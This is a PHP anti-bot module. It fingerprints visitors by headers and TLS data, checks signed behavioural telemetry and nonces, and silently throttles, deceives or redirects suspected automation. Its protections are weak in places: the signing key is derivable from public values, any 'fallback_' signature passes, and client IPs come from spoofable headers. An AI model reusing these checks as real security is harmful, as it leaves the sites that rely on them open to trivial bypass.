<?php

/**
 * Advanced Anti-Bot Detection System
 * 
 * SYSTEM PHILOSOPHY 🧠:
 * - Do not detect bots; detect inhuman behavior
 * - Do not ask for proof; observe consistency  
 * - Do not inconvenience users; exhaust bots
 * - Humans are noisy; bots are perfect - REJECT PERFECTION
 * 
 * MANDATORY RULES (Non-Negotiable):
 * 
 * 1️⃣ TLS/JA3 Mandatory:
 *    - Store TLS fingerprint (JA3) upon first request
 *    - Terminate signature immediately on JA3 change during session (silent)
 *    - Track JA3 reuse across sessions for cumulative risk
 *    - Neutralizes Playwright Stealth and automation
 * 
 * 2️⃣ Entropy Memory (Time-Based):
 *    - Store average time variance per fingerprint
 *    - Compare across multiple sessions (not just within one)
 *    - Consistent timing + minimal variation = Automation
 *    - No reliance on mouse or buttons, purely timing and physics
 * 
 * 3️⃣ Always Punish Perfection:
 *    - Excessive consistency = bot
 *    - Lack of hesitation = bot
 *    - Uniform responses = bot
 *    - Increase risk even with clean IPs
 *    - Humans are noisy; bots are perfect
 * 
 * 4️⃣ Silent Session Aging:
 *    - Automatically lower confidence for long sessions
 *    - Re-sign with new nonce
 *    - Delay responses if renewal fails
 *    - Reduce quality WITHOUT CAPTCHA
 *    - Let humans pass, exhaust/break bots
 * 
 * 5️⃣ Lightweight Deception:
 *    - Provide correct-looking but meaningless responses
 *    - Non-uniform delays
 *    - Light throttling
 *    - NO phantom pages or fake elements
 *    - Poison ML without harming UX
 * 
 * 6️⃣ Anti-Learning:
 *    - Randomize check order
 *    - Unpredictable weights within session
 *    - Randomize evaluation windows
 *    - Static logic is learnable = unacceptable
 * 
 * 7️⃣ Beyond Mouse Dependency:
 *    - Non-movement ≠ bot
 *    - Focus: timing variance, request spacing, network jitter, drift
 *    - Works on static pages
 */

$uri = $_SERVER['REQUEST_URI'] ?? '';
$basename = basename(parse_url($uri, PHP_URL_PATH));
$is_js_fetch = isset($_SERVER['HTTP_SEC_FETCH_MODE']) && $_SERVER['HTTP_SEC_FETCH_MODE'] === 'cors';

// Helper function to get client IP (needed early for POST handlers)
function get_client_ip(){
    if (!empty($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        return $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    if (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
        $xff = explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"]);
        return trim($xff[0]);
    }
    if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
        return $_SERVER["HTTP_CLIENT_IP"];
    }
    if (!empty($_SERVER["HTTP_FORWARDED_FOR"])) {
        $fwd = explode(",", $_SERVER["HTTP_FORWARDED_FOR"]);
        return trim($fwd[0]);
    }
    if (!empty($_SERVER["HTTP_FORWARDED"])) {
        $parts = explode(";", $_SERVER["HTTP_FORWARDED"]);
        foreach ($parts as $p) {
            $p = trim($p);
            if (stripos($p, "for=") === 0) {
                return trim(substr($p, 4));
            }
        }
    }
    return $_SERVER["REMOTE_ADDR"] ?? '0.0.0.0';
}

// ✅ Handle automation detection reports from frontend
if ($basename === 'antibot-report.php' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = file_get_contents('php://input');
    $report = json_decode($data, true);
    
    if ($report && isset($report['type']) && $report['type'] === 'automation_detected') {
        $log_dir = __DIR__ . '/logs';
        if (!is_dir($log_dir)) {
            @mkdir($log_dir, 0755, true);
        }
        
        $client_ip = get_client_ip();
        $log_entry = date('Y-m-d H:i:s') . ' | AUTOMATION DETECTED | IP: ' . 
                     $client_ip . 
                     ' | Flags: ' . implode(', ', $report['flags'] ?? []) . 
                     ' | Score: ' . ($report['score'] ?? 0) . "\n";
        
        file_put_contents($log_dir . '/automation.log', $log_entry, FILE_APPEND);
        
        // Block this IP immediately
        http_response_code(403);
        header('Location: https://www.google.com');
        exit;
    }
    exit;
}

// ============================================
// CRYPTOGRAPHIC SIGNATURE VERIFICATION
// ============================================

define('NONCE_FILE', __DIR__ . '/nonces.json');

/**
 * Load used nonces for replay attack prevention
 */
function load_nonces() {
    if (!file_exists(NONCE_FILE)) {
        file_put_contents(NONCE_FILE, json_encode([], JSON_PRETTY_PRINT));
    }
    return json_decode(file_get_contents(NONCE_FILE), true) ?: [];
}

/**
 * Save nonces
 */
function save_nonces($nonces) {
    file_put_contents(NONCE_FILE, json_encode($nonces, JSON_PRETTY_PRINT));
}

/**
 * Check if nonce has been used (replay attack detection)
 */
function is_nonce_used($nonce) {
    $nonces = load_nonces();
    return isset($nonces[$nonce]);
}

/**
 * Mark nonce as used
 */
function mark_nonce_used($nonce) {
    $nonces = load_nonces();
    $nonces[$nonce] = [
        'used_at' => time(),
        'ip' => get_client_ip()
    ];
    
    // Cleanup old nonces (older than 1 hour)
    $cutoff = time() - 3600;
    foreach ($nonces as $n => $data) {
        if ($data['used_at'] < $cutoff) {
            unset($nonces[$n]);
        }
    }
    
    save_nonces($nonces);
}

/**
 * Verify nonce is valid and not expired
 */
function verify_nonce($nonce) {
    // Nonce format: timestamp_random
    $parts = explode('_', $nonce);
    if (count($parts) < 2) {
        return false;
    }
    
    $timestamp = intval($parts[0]);
    $now = time() * 1000; // Convert to milliseconds
    
    // Nonce must not be older than 5 minutes
    if (($now - $timestamp) > 300000) {
        return false;
    }
    
    // Nonce must not be from the future (with 1 minute tolerance)
    if ($timestamp > $now + 60000) {
        return false;
    }
    
    // Check if nonce was already used (replay attack)
    if (is_nonce_used($nonce)) {
        return false;
    }
    
    return true;
}

/**
 * Generate expected signing key for a session
 * This matches the client-side key generation
 */
function generate_signing_key($session_id, $user_agent) {
    $keyBase = $session_id . '_' . $_SERVER['SERVER_NAME'] . '_' . substr($user_agent, 0, 50);
    return substr(base64_encode($keyBase), 0, 32);
}

/**
 * Verify HMAC signature of telemetry data
 */
function verify_telemetry_signature($payload, $signature, $nonce, $session_id, $user_agent) {
    // Generate expected signing key
    $signingKey = generate_signing_key($session_id, $user_agent);
    
    // Calculate expected signature: HMAC(key, nonce + payload)
    $messageToSign = $nonce . $payload;
    $expectedSignature = hash_hmac('sha256', $messageToSign, $signingKey);
    
    // Constant-time comparison to prevent timing attacks
    return hash_equals($expectedSignature, $signature);
}

// ✅ Handle behavioral tracking data from frontend with signature verification
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['track_behavior'])) {
    $behavior_json = $_POST['behavior_data'] ?? '';
    $signature = $_POST['signature'] ?? '';
    $nonce = $_POST['nonce'] ?? '';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    // CRITICAL: Verify signature before processing any data
    // This prevents bots from sending forged telemetry
    $signature_valid = false;
    $nonce_valid = false;
    
    if (!empty($signature) && !empty($nonce) && strlen($behavior_json) > 0) {
        // Parse behavior data to get session_id
        $behavior_data = json_decode($behavior_json, true);
        
        if ($behavior_data && isset($behavior_data['session_id'])) {
            // Verify nonce is valid and not reused
            $nonce_valid = verify_nonce($nonce);
            
            if ($nonce_valid) {
                // Verify signature
                if (strpos($signature, 'fallback_') === 0) {
                    // Client used fallback signing (old browser)
                    // Be more lenient but still validate format
                    $signature_valid = strlen($signature) > 20;
                } else {
                    // Full HMAC verification
                    $signature_valid = verify_telemetry_signature(
                        $behavior_json,
                        $signature,
                        $nonce,
                        $behavior_data['session_id'],
                        $user_agent
                    );
                }
                
                if ($signature_valid) {
                    // Mark nonce as used to prevent replay
                    mark_nonce_used($nonce);
                }
            }
        }
    }
    
    // Block unsigned or invalid telemetry
    if (!$signature_valid || !$nonce_valid) {
        // Log security event
        $client_ip = get_client_ip();
        $reason = !$nonce_valid ? 'Invalid/expired/reused nonce' : 'Invalid signature';
        
        if (is_dir(__DIR__ . '/logs')) {
            file_put_contents(
                __DIR__ . '/logs/security.log',
                date('Y-m-d H:i:s') . " | UNSIGNED_TELEMETRY | IP: {$client_ip} | Reason: {$reason}\n",
                FILE_APPEND
            );
        }
        
        // Return 403 Forbidden for unsigned data
        http_response_code(403);
        exit;
    }
    
    // Signature verified - process the data
    $behavior_json = $_POST['behavior_data'] ?? '';
    
    // Validate data size
    if (strlen($behavior_json) > 0 && strlen($behavior_json) <= 102400) { // 100KB max
        $behavior_data = json_decode($behavior_json, true);
        
        if ($behavior_data && isset($behavior_data['session_id'], $behavior_data['action'])) {
            // Use get_client_ip() to match the IP detection used throughout the system
            $client_ip = get_client_ip();
            
            // Track the behavioral data
            if ($behavior_data['action'] === 'batch_tracking') {
                // Load existing behavior data
                $all_behaviors = load_behavior_data();
                
                if (!isset($all_behaviors[$client_ip])) {
                    $all_behaviors[$client_ip] = ['sessions' => [], 'first_seen' => time()];
                }
                
                $session_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $behavior_data['session_id']);
                $session_id = substr($session_id, 0, 64);
                
                if (!isset($all_behaviors[$client_ip]['sessions'][$session_id])) {
                    $all_behaviors[$client_ip]['sessions'][$session_id] = [
                        'actions' => [],
                        'start_time' => time()
                    ];
                }
                
                // Add actions from the batch
                if (isset($behavior_data['actions']) && is_array($behavior_data['actions'])) {
                    foreach ($behavior_data['actions'] as $action) {
                        $all_behaviors[$client_ip]['sessions'][$session_id]['actions'][] = [
                            'action' => $action['action'] ?? 'unknown',
                            'timestamp' => $action['timestamp'] ?? time(),
                            'type' => $action['action'] ?? 'unknown',
                            'data' => $action['data'] ?? []
                        ];
                    }
                }
                
                // Save updated behavior data
                save_behavior_data($all_behaviors);
            }
        }
    }
    
    // Return success (no output needed for beacon)
    http_response_code(204); // No Content
    exit;
}

// ✅ استثناء كامل لمكالمات fetch()
if (
    in_array($basename, ['start_session.php', 'render.php']) &&
    $is_js_fetch
) {
    return;
}

define('FP_FILE', __DIR__ . '/fingerprints.json');
define('BEHAVIOR_FILE', __DIR__ . '/behavior_tracking.json');
define('ACCESS_LOG_FILE', __DIR__ . '/logs/access_log.json');

// Behavioral analysis thresholds (in milliseconds unless noted)
define('MIN_HUMAN_ACTION_TIME', 100);        // Minimum time between actions for humans (ms)
define('SESSION_GAP_THRESHOLD', 5);          // Minimum time between sessions for humans (seconds)
define('SESSION_GAP_SCORE', 30);             // Score penalty for suspicious session gaps
define('MAX_BEHAVIOR_DATA_SIZE', 102400);    // Maximum POST data size (100KB)

// Ensure logs directory exists
if (!is_dir(__DIR__ . '/logs')) {
    $dir_created = @mkdir(__DIR__ . '/logs', 0755, true);
    if (!$dir_created && !is_dir(__DIR__ . '/logs')) {
        error_log('Anti-bot: Failed to create logs directory');
    }
}

if (is_dir(__DIR__ . '/logs')) {
    file_put_contents('logs/blocked.txt', $_SERVER['REMOTE_ADDR']." | ".$_SERVER['HTTP_USER_AGENT']."\n", FILE_APPEND);
}

// Enhanced fingerprint system with dynamic salting and session-network binding
function load_fingerprints() {
    if (!file_exists(FP_FILE)) file_put_contents(FP_FILE, json_encode([], JSON_PRETTY_PRINT));
    return json_decode(file_get_contents(FP_FILE), true) ?: [];
}

/**
 * Extract network subnet from IP address
 * Supports IPv4 (first 3 octets) and basic IPv6 handling
 */
function extract_subnet($ip) {
    // Check if IPv6
    if (strpos($ip, ':') !== false) {
        // For IPv6, use first 4 segments (simplified subnet)
        $parts = explode(':', $ip);
        return implode(':', array_slice($parts, 0, min(4, count($parts)))) . '::';
    }
    
    // IPv4: first 3 octets
    $ip_parts = explode('.', $ip);
    if (count($ip_parts) !== 4) {
        // Invalid IP format, return as-is
        return $ip;
    }
    return implode('.', array_slice($ip_parts, 0, 3)) . '.0';
}

/**
 * Get secret salt for fingerprinting
 * Should be unique per installation and rotated periodically
 */
function get_fingerprint_salt() {
    global $config;
    
    // Try to get from config first
    if (isset($config['fingerprint_salt']) && !empty($config['fingerprint_salt'])) {
        return $config['fingerprint_salt'];
    }
    
    // Fallback: generate from server-specific data
    // Note: This should be set in config.php for production
    $server_unique = $_SERVER['SERVER_NAME'] ?? 'localhost';
    $server_unique .= $_SERVER['DOCUMENT_ROOT'] ?? __DIR__;
    return hash('sha256', $server_unique . 'antibot_fallback_salt');
}

/**
 * Generate dynamic salted fingerprint with session-network binding
 * Prevents static replayable fingerprints by incorporating:
 * - Dynamic timestamp-based salt (rotates every hour)
 * - Session ID binding
 * - Network characteristics (IP subnet)
 * - TLS/HTTP header entropy
 */
function generate_dynamic_fingerprint($ip, $session_id = null) {
    // Dynamic salt that rotates every hour using config-based secret
    $hour_salt = hash('sha256', date('YmdH') . get_fingerprint_salt());
    
    // Session binding - use actual session ID or generate one
    if ($session_id === null) {
        if (session_status() === PHP_SESSION_NONE) {
            @session_start();
        }
        $session_id = session_id();
    }
    
    // Network binding - extract subnet with IPv4/IPv6 support
    $subnet = extract_subnet($ip);
    
    // TLS/HTTP header entropy analysis
    $header_entropy = calculate_header_entropy();
    
    // Combine all factors with dynamic salt
    $fingerprint_data = [
        'hour_salt' => $hour_salt,
        'session_id' => $session_id,
        'subnet' => $subnet,
        'header_entropy' => $header_entropy,
        'timestamp' => time()
    ];
    
    return hash('sha256', json_encode($fingerprint_data));
}

/**
 * Calculate TLS/HTTP header entropy for fingerprinting
 * Analyzes header patterns similar to JA3 fingerprinting
 */
function calculate_header_entropy() {
    $headers = [];
    
    // Collect significant headers in order (like JA3)
    $header_keys = [
        'HTTP_USER_AGENT',
        'HTTP_ACCEPT',
        'HTTP_ACCEPT_LANGUAGE',
        'HTTP_ACCEPT_ENCODING',
        'HTTP_CONNECTION',
        'HTTP_SEC_CH_UA',
        'HTTP_SEC_CH_UA_MOBILE',
        'HTTP_SEC_CH_UA_PLATFORM',
        'HTTP_SEC_FETCH_SITE',
        'HTTP_SEC_FETCH_MODE',
        'HTTP_SEC_FETCH_DEST',
        'HTTP_SEC_FETCH_USER',
        'HTTP_UPGRADE_INSECURE_REQUESTS',
        'HTTP_DNT',
        'HTTP_CACHE_CONTROL',
        'HTTP_PRAGMA'
    ];
    
    foreach ($header_keys as $key) {
        $headers[] = isset($_SERVER[$key]) ? substr($_SERVER[$key], 0, 50) : '';
    }
    
    // Calculate entropy hash (similar to JA3 approach)
    return hash('md5', implode('|', $headers));
}

/**
 * Enhanced JA3-like TLS Fingerprinting
 * Generates a fingerprint based on TLS client hello and HTTP headers
 * True JA3 requires SSL/TLS layer access, this is a PHP-level approximation
 */
function generate_ja3_fingerprint() {
    global $config;
    
    if (!isset($config['tls_fingerprinting']) || !$config['tls_fingerprinting']['enabled']) {
        return null;
    }
    
    $components = [];
    
    // 1. SSL/TLS Version (if available via server variable)
    $components[] = $_SERVER['SSL_PROTOCOL'] ?? 'unknown';
    
    // 2. Cipher Suite (if available)
    $components[] = $_SERVER['SSL_CIPHER'] ?? 'unknown';
    
    // 3. Header ordering fingerprint (browsers have consistent header order)
    $header_order = [];
    if (function_exists('getallheaders')) {
        $all_headers = getallheaders();
        if ($all_headers) {
            foreach (array_keys($all_headers) as $header) {
                // Normalize header names
                $header_order[] = strtolower(str_replace('-', '_', $header));
            }
        }
    } else {
        // Fallback: use $_SERVER array
        foreach ($_SERVER as $key => $value) {
            if (strpos($key, 'HTTP_') === 0) {
                $header_order[] = strtolower($key);
            }
        }
    }
    $components[] = implode(',', $header_order);
    
    // 4. Accept header analysis (browsers have distinct Accept patterns)
    $accept_headers = [
        $_SERVER['HTTP_ACCEPT'] ?? '',
        $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '',
        $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? ''
    ];
    $components[] = implode('|', $accept_headers);
    
    // 5. Client hints (Chrome-specific)
    $client_hints = [
        $_SERVER['HTTP_SEC_CH_UA'] ?? '',
        $_SERVER['HTTP_SEC_CH_UA_MOBILE'] ?? '',
        $_SERVER['HTTP_SEC_CH_UA_PLATFORM'] ?? '',
        $_SERVER['HTTP_SEC_CH_UA_ARCH'] ?? '',
        $_SERVER['HTTP_SEC_CH_UA_BITNESS'] ?? '',
        $_SERVER['HTTP_SEC_CH_UA_MODEL'] ?? ''
    ];
    $components[] = implode('|', $client_hints);
    
    // 6. Fetch metadata (modern browsers)
    $fetch_metadata = [
        $_SERVER['HTTP_SEC_FETCH_SITE'] ?? '',
        $_SERVER['HTTP_SEC_FETCH_MODE'] ?? '',
        $_SERVER['HTTP_SEC_FETCH_USER'] ?? '',
        $_SERVER['HTTP_SEC_FETCH_DEST'] ?? ''
    ];
    $components[] = implode('|', $fetch_metadata);
    
    // Generate final JA3-like hash
    return hash('sha256', implode('||', $components));
}

/**
 * Track cumulative JA3 reuse across sessions (Silent Risk)
 * Detects if same JA3 is used by many different sessions
 */
function track_ja3_cumulative_reuse($ja3) {
    global $config;
    
    if (!($config['tls_fingerprinting']['track_cumulative_reuse'] ?? false)) {
        return;
    }
    
    $ja3_tracking_file = __DIR__ . '/ja3_tracking.json';
    $ja3_data = [];
    
    if (file_exists($ja3_tracking_file)) {
        $ja3_data = json_decode(file_get_contents($ja3_tracking_file), true) ?: [];
    }
    
    if (!isset($ja3_data[$ja3])) {
        $ja3_data[$ja3] = [
            'first_seen' => time(),
            'session_count' => 0,
            'ip_addresses' => []
        ];
    }
    
    $ja3_data[$ja3]['session_count']++;
    $ja3_data[$ja3]['last_seen'] = time();
    
    // Track unique IPs using this JA3
    $client_ip = get_client_ip();
    if (!in_array($client_ip, $ja3_data[$ja3]['ip_addresses'])) {
        $ja3_data[$ja3]['ip_addresses'][] = $client_ip;
    }
    
    // Cleanup old entries (older than 7 days)
    $cutoff = time() - (7 * 86400);
    foreach ($ja3_data as $ja3_hash => $data) {
        if (($data['last_seen'] ?? 0) < $cutoff) {
            unset($ja3_data[$ja3_hash]);
        }
    }
    
    file_put_contents($ja3_tracking_file, json_encode($ja3_data, JSON_PRETTY_PRINT));
    
    // Log if threshold exceeded (Silent Risk)
    $threshold = $config['tls_fingerprinting']['cumulative_reuse_threshold'] ?? 10;
    if ($ja3_data[$ja3]['session_count'] >= $threshold) {
        if (is_dir(__DIR__ . '/logs')) {
            file_put_contents(
                __DIR__ . '/logs/security.log',
                date('Y-m-d H:i:s') . " | JA3_CUMULATIVE_RISK | JA3: " . substr($ja3, 0, 16) . 
                "... | Sessions: " . $ja3_data[$ja3]['session_count'] . 
                " | Unique IPs: " . count($ja3_data[$ja3]['ip_addresses']) . "\n",
                FILE_APPEND
            );
        }
    }
}

/**
 * Verify JA3 fingerprint match for session
 * Detects if TLS fingerprint changed (session hijacking indicator)
 * TERMINATES SESSION SILENTLY on mismatch if configured
 */
function verify_ja3_match($ip, $stored_fingerprint_data) {
    global $config;
    
    if (!isset($config['tls_fingerprinting']) || !$config['tls_fingerprinting']['enabled']) {
        return true; // Skip if disabled
    }
    
    // Generate current JA3 fingerprint
    $current_ja3 = generate_ja3_fingerprint();
    
    if (!$current_ja3) {
        return true; // Can't verify, allow
    }
    
    // Track cumulative JA3 reuse
    track_ja3_cumulative_reuse($current_ja3);
    
    // Check if stored fingerprint has JA3 data
    if (!isset($stored_fingerprint_data['ja3'])) {
        return true; // First time, no comparison possible
    }
    
    $stored_ja3 = $stored_fingerprint_data['ja3'];
    
    // Compare JA3 fingerprints
    if ($current_ja3 !== $stored_ja3) {
        // JA3 mismatch detected - possible Playwright Stealth or automation
        
        // Log this security event
        if (is_dir(__DIR__ . '/logs')) {
            file_put_contents(
                __DIR__ . '/logs/security.log',
                date('Y-m-d H:i:s') . " | JA3_MISMATCH | IP: {$ip} | " .
                "Stored: " . substr($stored_ja3, 0, 16) . "... | " .
                "Current: " . substr($current_ja3, 0, 16) . "...\n",
                FILE_APPEND
            );
        }
        
        // MANDATORY: Terminate signature immediately if configured
        if ($config['tls_fingerprinting']['terminate_on_change'] ?? true) {
            // Clear all verification cookies silently
            setcookie('fp_hash', '', time() - 3600, '/');
            setcookie('js_verified', '', time() - 3600, '/');
            setcookie('analysis_done', '', time() - 3600, '/');
            setcookie('behavior_verified', '', time() - 3600, '/');
            
            // End session silently - no explicit messages
            // Redirect to a neutral page or show loading indefinitely
            http_response_code(403);
            exit; // Silent termination
        }
        
        return false; // Mismatch
    }
    
    return true; // Match
}

/**
 * Verify session-network binding
 * Ensures the session is bound to the same network context
 * Checks: IP subnet, TLS/JA3 fingerprint, User-Agent hash
 */
function verify_session_binding($ip, $stored_fingerprint) {
    global $config;
    
    // Generate current fingerprint with same session
    $current_fingerprint = generate_dynamic_fingerprint($ip);
    
    // For session binding, we verify multiple factors
    $current_subnet = extract_subnet($ip);
    $current_user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $current_ua_hash = hash('sha256', $current_user_agent);
    $current_ja3 = generate_ja3_fingerprint();
    
    // Check if stored fingerprint data exists
    $fps = load_fingerprints();
    if (!isset($fps[$ip])) {
        return false;
    }
    
    $stored_data = $fps[$ip];
    $mismatches = [];
    
    // 1. Check subnet binding (if enabled)
    if ($config['enforce_subnet_binding'] ?? true) {
        if (isset($stored_data['subnet']) && $stored_data['subnet'] !== $current_subnet) {
            $mismatches[] = 'subnet_changed';
        }
    }
    
    // 2. Check TLS/JA3 binding (if enabled)
    if ($config['enforce_tls_binding'] ?? true) {
        if (isset($stored_data['ja3']) && $stored_data['ja3'] !== $current_ja3) {
            $mismatches[] = 'ja3_mismatch';
        }
    }
    
    // 3. Check User-Agent binding (if enabled)
    if ($config['enforce_ua_binding'] ?? true) {
        if (isset($stored_data['user_agent_hash']) && $stored_data['user_agent_hash'] !== $current_ua_hash) {
            $mismatches[] = 'user_agent_changed';
        }
    }
    
    // Log mismatches for security monitoring
    if (!empty($mismatches)) {
        if (is_dir(__DIR__ . '/logs')) {
            file_put_contents(
                __DIR__ . '/logs/security.log',
                date('Y-m-d H:i:s') . " | SESSION_BINDING_VIOLATION | IP: {$ip} | " .
                "Mismatches: " . implode(', ', $mismatches) . "\n",
                FILE_APPEND
            );
        }
        return false; // Binding violated
    }
    
    return true; // All checks passed
}

function save_fingerprint($ip, $hash, $session_id = null) {
    global $config;
    $fps = load_fingerprints();
    
    // Store fingerprint with metadata for binding verification
    $subnet = extract_subnet($ip);
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $user_agent_hash = hash('sha256', $user_agent);
    
    // Generate JA3-like fingerprint
    $ja3_fingerprint = generate_ja3_fingerprint();
    
    $fps[$ip] = [
        'hash' => $hash,
        'subnet' => $subnet,
        'session_id' => $session_id ?? session_id(),
        'created_at' => time(),
        'header_entropy' => calculate_header_entropy(),
        'ja3' => $ja3_fingerprint,
        'user_agent_hash' => $user_agent_hash,
        'last_verified' => time()
    ];
    
    file_put_contents(FP_FILE, json_encode($fps, JSON_PRETTY_PRINT));
}

function get_fingerprint_for_ip($ip) {
    $fps = load_fingerprints();
    return $fps[$ip] ?? null;
}

// Admin monitoring - Log access attempt with secure logging practices
function log_access_attempt($ip, $verdict, $bot_score, $bot_analysis, $characteristics = [], $automation_flags = []) {
    global $config;
    
    if (!defined('ACCESS_LOG_FILE')) {
        return; // Skip if not defined
    }
    
    // Get logging configuration
    $logging_config = $config['logging'] ?? [];
    $hash_fingerprints = $logging_config['hash_fingerprints'] ?? true;
    $hide_rejection_reasons = $logging_config['hide_rejection_reasons'] ?? true;
    $hide_raw_scores = $logging_config['hide_raw_scores'] ?? true;
    $separate_security_logs = $logging_config['separate_security_logs'] ?? true;
    
    // Hash IP for privacy (but keep in security log)
    $hashed_ip = $hash_fingerprints ? hash('sha256', $ip . 'antibot_salt') : $ip;
    
    // Load existing logs
    $logs = [];
    if (file_exists(ACCESS_LOG_FILE)) {
        $content = file_get_contents(ACCESS_LOG_FILE);
        $logs = json_decode($content, true) ?: [];
    }
    
    // Create log entry with obfuscated data
    $entry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'ip_hash' => $hashed_ip, // Hashed for privacy
        'verdict' => $verdict, // 'human', 'bot', 'uncertain', 'automation'
        'bot_score' => $hide_raw_scores ? 'hidden' : round($bot_score, 2),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        'characteristics' => $characteristics,
        'domain_scores' => [
            'temporal' => $hide_raw_scores ? 'hidden' : ($bot_analysis['domain_scores']['temporal'] ?? 0),
            'noise' => $hide_raw_scores ? 'hidden' : ($bot_analysis['domain_scores']['noise'] ?? 0),
            'semantics' => $hide_raw_scores ? 'hidden' : ($bot_analysis['domain_scores']['semantics'] ?? 0),
            'continuity' => $hide_raw_scores ? 'hidden' : ($bot_analysis['domain_scores']['continuity'] ?? 0)
        ],
        'flags' => $hide_rejection_reasons ? ['hidden'] : ($bot_analysis['reasons'] ?? []),
        'automation_flags' => $automation_flags
    ];
    
    // Add to logs (keep last 1000 entries)
    $logs[] = $entry;
    $logs = array_slice($logs, -1000);
    
    // Save to main access log
    file_put_contents(ACCESS_LOG_FILE, json_encode($logs, JSON_PRETTY_PRINT));
    
    // If separate security logs enabled, write detailed info there
    if ($separate_security_logs && isset($config['security_log_file'])) {
        $security_entry = date('Y-m-d H:i:s') . " | " . 
            "VERDICT: {$verdict} | " .
            "IP: {$ip} | " . // Real IP in security log
            "SCORE: " . round($bot_score, 2) . " | " .
            "REASONS: " . implode(', ', $bot_analysis['reasons'] ?? []) . "\n";
        
        file_put_contents($config['security_log_file'], $security_entry, FILE_APPEND);
    }
}

// Behavioral tracking functions
function load_behavior_data() {
    if (!file_exists(BEHAVIOR_FILE)) {
        file_put_contents(BEHAVIOR_FILE, json_encode([], JSON_PRETTY_PRINT));
    }
    return json_decode(file_get_contents(BEHAVIOR_FILE), true) ?: [];
}

function save_behavior_data($data) {
    file_put_contents(BEHAVIOR_FILE, json_encode($data, JSON_PRETTY_PRINT));
}

// ============================================
// SESSION AGING & TRUST DECAY
// ============================================

/**
 * Calculate session trust score based on age
 * Trust decreases over time to force periodic re-evaluation
 * PHILOSOPHY: Let humans pass, exhaust/break bots
 */
function calculate_session_trust($session_start_time, $config) {
    $now = time();
    $session_age = $now - $session_start_time;
    
    // Get decay rate from config (default 5% per hour)
    $decay_rate_per_hour = $config['session_trust_decay_rate'] ?? 5;
    
    // Check if this is a long session (different decay rate)
    $silent_aging = $config['silent_aging'] ?? [];
    $long_session_threshold = $silent_aging['long_session_threshold'] ?? 7200;
    
    if ($session_age > $long_session_threshold && ($silent_aging['enabled'] ?? true)) {
        // Long session - apply accelerated decay
        $decay_rate_per_hour = $silent_aging['confidence_decay_rate'] ?? 10;
    }
    
    // Calculate hours elapsed
    $hours_elapsed = $session_age / 3600;
    
    // Calculate trust: starts at 100%, decays over time
    $trust = 100 - ($hours_elapsed * $decay_rate_per_hour);
    
    // Trust can't go below 0
    $trust = max(0, $trust);
    
    // Check if session exceeded max age
    $max_age = $config['session_max_age'] ?? 86400; // 24 hours default
    if ($session_age > $max_age) {
        // Session too old - force re-verification
        return 0;
    }
    
    return $trust;
}

/**
 * Silent session aging mechanism
 * Automatically lower confidence for long sessions
 * Apply response delays and reduce quality without CAPTCHA
 * Returns: 'allow', 'delay', 'renew', or 'terminate'
 */
function apply_silent_aging($ip, $config) {
    $silent_aging = $config['silent_aging'] ?? [];
    
    if (!($silent_aging['enabled'] ?? true)) {
        return 'allow';
    }
    
    // Get fingerprint data for session age
    $fp_data = get_fingerprint_for_ip($ip);
    if (!$fp_data || !isset($fp_data['created_at'])) {
        return 'allow'; // No session data
    }
    
    $session_age = time() - $fp_data['created_at'];
    $long_session_threshold = $silent_aging['long_session_threshold'] ?? 7200;
    
    // Not a long session yet
    if ($session_age < $long_session_threshold) {
        return 'allow';
    }
    
    // Calculate current trust
    $trust = calculate_session_trust($fp_data['created_at'], $config);
    
    // If trust very low, attempt silent renewal
    if ($trust < 30) {
        // Try to renew session with new nonce
        if ($silent_aging['auto_renew_nonce'] ?? true) {
            $renewal_success = attempt_silent_session_renewal($ip, $fp_data, $config);
            
            if (!$renewal_success) {
                // Renewal failed - apply degradation
                
                // Apply response delay (waste bot resources)
                if (isset($silent_aging['delay_on_renewal_fail'])) {
                    $delay_range = $silent_aging['delay_on_renewal_fail'];
                    $delay_ms = rand($delay_range[0], $delay_range[1]);
                    usleep($delay_ms * 1000);
                }
                
                // Signal to reduce response quality
                if ($silent_aging['reduce_quality_on_fail'] ?? true) {
                    return 'delay'; // Caller should apply quality reduction
                }
            } else {
                // Renewal successful
                return 'renew';
            }
        }
    }
    
    // Trust still acceptable
    if ($trust >= 30) {
        return 'allow';
    }
    
    // Trust too low and renewal failed
    return 'delay';
}

/**
 * Attempt silent session renewal
 * Re-sign session with new nonce and updated fingerprint
 * Returns true if renewal successful, false otherwise
 */
function attempt_silent_session_renewal($ip, $old_fp_data, $config) {
    // Verify current session is still valid
    $binding_valid = verify_session_binding($ip, $old_fp_data['hash'] ?? '');
    
    if (!$binding_valid) {
        return false; // Can't renew - binding violated
    }
    
    // Generate new dynamic fingerprint with updated timestamp
    $new_fp = generate_dynamic_fingerprint($ip, $old_fp_data['session_id'] ?? null);
    
    // Verify JA3 hasn't changed (mandatory check)
    $ja3_valid = verify_ja3_match($ip, $old_fp_data);
    if (!$ja3_valid) {
        return false; // JA3 mismatch - terminate
    }
    
    // Save updated fingerprint with new timestamp
    save_fingerprint($ip, $new_fp, $old_fp_data['session_id'] ?? null);
    
    // Update cookie with new fingerprint (silent renewal)
    setcookie('fp_hash', $new_fp, time() + 86400, '/');
    
    // Log silent renewal
    if (is_dir(__DIR__ . '/logs')) {
        file_put_contents(
            __DIR__ . '/logs/security.log',
            date('Y-m-d H:i:s') . " | SILENT_RENEWAL | IP: {$ip} | " .
            "Session age: " . (time() - ($old_fp_data['created_at'] ?? time())) . "s\n",
            FILE_APPEND
        );
    }
    
    return true;
}

/**
 * Check if session needs re-evaluation
 * Returns true if trust is too low or behavioral deviations detected
 */
function needs_reevaluation($ip, $config) {
    // Check fingerprint data for session age
    $fp_data = get_fingerprint_for_ip($ip);
    if (!$fp_data || !isset($fp_data['created_at'])) {
        return true; // No valid session
    }
    
    // Calculate current trust
